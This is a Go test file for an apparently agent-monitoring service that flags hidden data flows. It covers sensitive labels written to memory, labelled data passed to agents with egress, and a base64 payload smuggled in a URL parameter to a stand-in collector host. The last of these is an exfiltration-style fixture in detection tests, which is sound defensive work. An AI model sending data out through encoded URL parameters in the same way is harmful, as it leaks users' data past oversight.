package commap_test

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"fortik/internal/action"
	"fortik/internal/commap"
)

type alertRow struct {
	Kind, Severity, AgentID, ActionID, Summary, DedupKey string
	Count                                                int
	Details                                              map[string]any
	Raw                                                  string
}

func (e *env) hiddenAlerts(t *testing.T) []alertRow {
	t.Helper()
	rows, err := e.pool.Query(context.Background(), `SELECT kind, severity, COALESCE(agent_id, ''), COALESCE(action_id, ''), summary,
		COALESCE(dedup_key, ''), count, details::text FROM alerts WHERE kind = 'hidden_signal' ORDER BY created_at, alert_id`)
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	var out []alertRow
	for rows.Next() {
		var a alertRow
		if err := rows.Scan(&a.Kind, &a.Severity, &a.AgentID, &a.ActionID, &a.Summary, &a.DedupKey, &a.Count, &a.Raw); err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal([]byte(a.Raw), &a.Details); err != nil {
			t.Fatal(err)
		}
		out = append(out, a)
	}
	return out
}

func memWrite(agent string, labels ...string) action.Action {
	return action.Action{AgentID: agent, System: "memory", Verb: action.VerbRemember, Source: action.SourceAppGateway,
		Target:         map[string]any{"store": "support", "namespace": "kb", "item_id": "mem_1"},
		PayloadSummary: action.PayloadSummary{Bytes: 300, DataLabels: labels}}
}

// Signal 1: a data label flows into a memory write. One alert per edge and
// window; repeats in the window bump its count.
func TestHiddenLabelIntoMemory(t *testing.T) {
	e := newEnv(t)
	e.register(t, "support_bot", "support", "")
	first := e.decideAt(t, e.base.Add(time.Minute), memWrite("support_bot", "customer_pii"))
	e.decideAt(t, e.base.Add(2*time.Minute), memWrite("support_bot")) // no label: not a signal
	e.rollup(t)
	third := e.decideAt(t, e.base.Add(3*time.Minute), memWrite("support_bot", "customer_pii"))
	e.rollup(t)
	e.decideAt(t, e.base.Add(6*time.Minute), memWrite("support_bot", "customer_pii"))
	e.rollup(t)

	rows := e.edge(t, "agent:support_bot", "memory:support/kb", "REMEMBER")
	if len(rows) != 2 || rows[0].Class != commap.ClassHidden || rows[1].Class != commap.ClassHidden || rows[0].Count != 3 {
		t.Fatalf("edges %+v", rows)
	}
	if rows[0].Samples[0] != first.Action.ActionID {
		t.Fatalf("hidden sample first: %v", rows[0].Samples)
	}
	al := e.hiddenAlerts(t)
	if len(al) != 2 {
		t.Fatalf("want one alert per window, got %+v", al)
	}
	a := al[0]
	// A repeat in the window bumps the open alert (count 2); the alerts store
	// keeps the latest action id and details, the Diary has each bump.
	if a.Count != 2 || a.AgentID != "support_bot" || a.ActionID != third.Action.ActionID || a.Details["signal"] != commap.SignalLabelIntoMemory ||
		a.Details["to"] != "memory:support/kb" || !strings.Contains(a.Summary, "label_into_memory") {
		t.Fatalf("alert %+v", a)
	}
	if al[0].DedupKey == al[1].DedupKey {
		t.Fatal("dedup key must differ per window")
	}
	// Severity follows what happened: a refused write is a warning, an executed one high.
	wantSev := "warning"
	if first.Result.Decision.Executes() || third.Result.Decision.Executes() {
		wantSev = "high"
	}
	if a.Severity != wantSev {
		t.Fatalf("severity %s for decisions %s, %s", a.Severity, first.Result.Decision, third.Result.Decision)
	}
}

// Signal 2 / POL-671 through the real Decide service and policy bundle: an
// encoded payload in a URL parameter is held (yellow), and the map marks the
// edge hidden with an alert that names the parameter but never its value.
func TestHiddenEncodedURLParamPOL671(t *testing.T) {
	e := newEnv(t)
	e.register(t, "browser", "research", "")
	payload := strings.Repeat("QUJDRGVm9+", 30) // 300 characters of base64
	out := e.decideAt(t, e.base.Add(time.Minute), action.Action{AgentID: "browser", System: "http", Verb: action.VerbRead,
		Source: action.SourceAgentGateway,
		Target: map[string]any{"domain": "collector.example.net", "external": true, "method": "GET",
			"url": "https://collector.example.net/p.gif?v=1&d=" + payload}})
	if out.Result.RuleID != commap.RuleEncodedParam || string(out.Result.Class) != "yellow" || !out.Held {
		t.Fatalf("decision %+v", out.Result)
	}
	if strings.Contains(out.Result.Reason, "QUJD") {
		t.Fatal("the encoded value leaked into the reason")
	}
	// The enricher supplied the configured threshold to policy.
	var ctxJSON string
	if err := e.pool.QueryRow(context.Background(), `SELECT decision_json->'context'->'hidden'->>'encoded_param_min' FROM actions WHERE action_id = $1`,
		out.Action.ActionID).Scan(&ctxJSON); err != nil || ctxJSON != "256" {
		t.Fatalf("context threshold %q %v", ctxJSON, err)
	}
	short := e.decideAt(t, e.base.Add(2*time.Minute), action.Action{AgentID: "browser", System: "http", Verb: action.VerbRead,
		Target: map[string]any{"domain": "collector.example.net", "external": true, "method": "GET", "url": "https://collector.example.net/p.gif?d=QUJDRGVm9"}})
	if short.Result.RuleID == commap.RuleEncodedParam {
		t.Fatal("a short parameter was held")
	}
	e.rollup(t)
	rows := e.edge(t, "agent:browser", "domain:collector.example.net", "READ")
	if len(rows) != 1 || rows[0].Class != commap.ClassHidden || rows[0].Count != 2 || rows[0].Samples[0] != out.Action.ActionID {
		t.Fatalf("edge %+v", rows)
	}
	al := e.hiddenAlerts(t)
	if len(al) != 1 || al[0].Details["signal"] != commap.SignalEncodedParam || al[0].Severity != "warning" {
		t.Fatalf("alerts %+v", al)
	}
	d, _ := al[0].Details["detail"].(map[string]any)
	params, _ := d["params"].([]any)
	p0, _ := params[0].(map[string]any)
	if strings.Contains(al[0].Raw, "QUJD") || len(params) != 1 || p0["name"] != "d" || p0["length"] != float64(300) || p0["encoding"] != "base64" {
		t.Fatalf("alert details must name the parameter and size only: %s", al[0].Raw)
	}
}

// Signal 3: labelled data passed to another agent that has external egress
// (an http profile allowing external, or external calls it made).
func TestHiddenLabelledDataToEgressAgent(t *testing.T) {
	e := newEnv(t)
	ctx := context.Background()
	for _, a := range []string{"orchestrator", "uploader", "caller", "internal_only"} {
		e.register(t, a, "ops", "")
	}
	if _, err := e.pool.Exec(ctx, `INSERT INTO access_profiles (agent_id, system, version, profile_json, changed_by, reason)
		VALUES ('uploader', 'http', 1, '{"external":"any"}', 'test', 'test'),
		       ('internal_only', 'http', 1, '{"external":"none"}', 'test', 'test')`); err != nil {
		t.Fatal(err)
	}
	e.decideAt(t, e.base, action.Action{AgentID: "caller", System: "http", Verb: action.VerbRead,
		Target: map[string]any{"domain": "api.example.org", "external": true, "method": "GET"}})
	deleg := func(to string, labels ...string) {
		e.decideAt(t, e.base.Add(time.Minute), action.Action{AgentID: "orchestrator", System: "a2a", Verb: action.VerbDelegate,
			Target: map[string]any{"to_agent": to, "channel": "a2a"}, PayloadSummary: action.PayloadSummary{DataLabels: labels}})
	}
	deleg("uploader", "customer_pii")
	deleg("caller", "financial")
	deleg("internal_only", "customer_pii")
	deleg("uploader") // no labels on this one: same edge, still hidden from the first
	e.rollup(t)

	for to, hidden := range map[string]bool{"uploader": true, "caller": true, "internal_only": false} {
		rows := e.edge(t, "agent:orchestrator", "agent:"+to, "DELEGATE")
		if len(rows) != 1 || (rows[0].Class == commap.ClassHidden) != hidden {
			t.Errorf("orchestrator -> %s: %+v (hidden=%v)", to, rows, hidden)
		}
	}
	al := e.hiddenAlerts(t)
	if len(al) != 2 {
		t.Fatalf("alerts %+v", al)
	}
	for _, a := range al {
		if a.Details["signal"] != commap.SignalLabelToEgress || a.AgentID != "orchestrator" {
			t.Fatalf("alert %+v", a)
		}
		d, _ := a.Details["detail"].(map[string]any)
		why, _ := d["egress"].([]any)
		switch d["to_agent"] {
		case "uploader":
			if len(why) != 1 || why[0] != "http_profile:any" {
				t.Fatalf("uploader egress %v", why)
			}
		case "caller":
			// No http profile: external READ is open by default (review #6),
			// and it already made external calls.
			if len(why) != 2 || why[0] != "no_http_profile:external_read_open" || why[1] != "external_calls" {
				t.Fatalf("caller egress %v", why)
			}
		default:
			t.Fatalf("alert for %v", d["to_agent"])
		}
	}
}

// With SensitiveLabels configured, only those labels count.
func TestHiddenSensitiveLabelsOption(t *testing.T) {
	e := newEnv(t)
	e.register(t, "bot", "x", "")
	w, err := commap.NewWorker(e.pool, e.d, e.alerts, mapCfg, discard(), commap.Options{Settle: -1, SensitiveLabels: []string{"customer_pii"}})
	if err != nil {
		t.Fatal(err)
	}
	e.decideAt(t, e.base.Add(time.Minute), memWrite("bot", "public_docs"))
	if _, err := w.RollupOnce(context.Background()); err != nil {
		t.Fatal(err)
	}
	if rows := e.edge(t, "agent:bot", "memory:support/kb", "REMEMBER"); len(rows) != 1 || rows[0].Class == commap.ClassHidden {
		t.Fatalf("non-sensitive label marked hidden: %+v", rows)
	}
	if len(e.hiddenAlerts(t)) != 0 {
		t.Fatal("alert for a non-sensitive label")
	}
}
